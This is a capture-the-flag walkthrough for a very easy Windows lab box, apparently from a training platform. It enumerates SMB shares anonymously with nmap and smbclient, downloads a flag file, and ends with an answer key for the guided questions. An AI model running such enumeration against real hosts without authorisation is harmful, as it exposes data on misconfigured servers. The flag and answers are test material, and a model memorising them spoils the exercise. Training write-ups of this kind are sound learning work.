# Dancing

|            |                                                                  |
|------------|------------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                          |
| Difficulty | Very Easy                                                        |
| OS         | Windows                                                          |
| Tags       | Network, Protocols, SMB, Reconnaissance, Anonymous Access        |
| Tools      | `nmap`, `smbclient`                                              |

## Summary

Windows host with one non-default SMB share (`WorkShares`) readable without
auth. The trick is the share-listing pass with `smbclient -L` against a blank
password, which reveals which shares are even guest-browseable before you
bother trying to mount them.

## Solve

```bash
nmap -sV -p 445 10.129.1.12
# 445/tcp open  microsoft-ds?

# Enumerate shares without creds
smbclient -L 10.129.1.12
#   ADMIN$       Disk    Remote Admin
#   C$           Disk    Default share
#   IPC$         IPC     Remote IPC
#   WorkShares   Disk

# Connect to the non-default share
smbclient //10.129.1.12/WorkShares
smb: \> cd James.P
smb: \James.P\> get flag.txt

cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the 3-letter acronym SMB stand for? | Server Message Block |
| 2 | What port does SMB use to operate at? | 445 |
| 3 | What is the service name for port 445 that came up in our Nmap scan? | microsoft-ds |
| 4 | What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share? | -L |
| 5 | How many shares are there on Dancing? | 4 |
| 6 | What is the name of the share we are able to access in the end with a blank password? | WorkShares |
| 7 | What is the command we can use within the SMB shell to download the files we find? | get |
